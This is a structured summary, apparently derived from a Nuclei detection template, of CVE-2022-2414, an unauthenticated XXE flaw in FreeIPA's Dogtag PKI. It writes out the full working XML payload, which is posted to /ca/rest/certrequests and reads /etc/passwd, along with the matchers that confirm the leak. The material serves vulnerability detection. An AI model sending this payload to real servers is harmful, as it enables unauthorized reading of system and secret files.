---
cve_id: CVE-2022-2414
template_path: nuclei-templates/http/cves/2022/CVE-2022-2414.yaml
affected_product: FreeIPA
severity: high
authentication: none
external_callback: false
affected_versions: unknown
preconditions: []
poc_classification: info-leak
---

## Vulnerability
FreeIPA (Dogtag PKI component) contains an XML External Entity Injection (XXE, CWE-611) flaw in its XML parser. Remote unauthenticated attackers can force external entity resolution by submitting specially crafted XML to the certificate enrollment endpoint, allowing retrieval of arbitrary local files (e.g. `/etc/passwd`, configuration files, or secrets). CVSS 3.1 vector AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (score 7.5) reflects high-confidentiality impact with no authentication or interaction required. Remediation requires applying the vendor security patches.

## PoC / Detection
Classification: info-leak

The template sends one raw POST request to `/ca/rest/certrequests` with `Content-Type: application/xml` containing:
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```
Matchers (AND condition) verify successful file exfiltration by checking:
- regex `root:.*:0:0:` in response body
- word `PKIException` in body
- word `application/xml` in header
- status code 400

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/Dogtag/Dogtag%20PKI%20XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-2414.md
- https://nvd.nist.gov/vuln/detail/CVE-2022-2414
- https://github.com/dogtagpki/pki/pull/4021
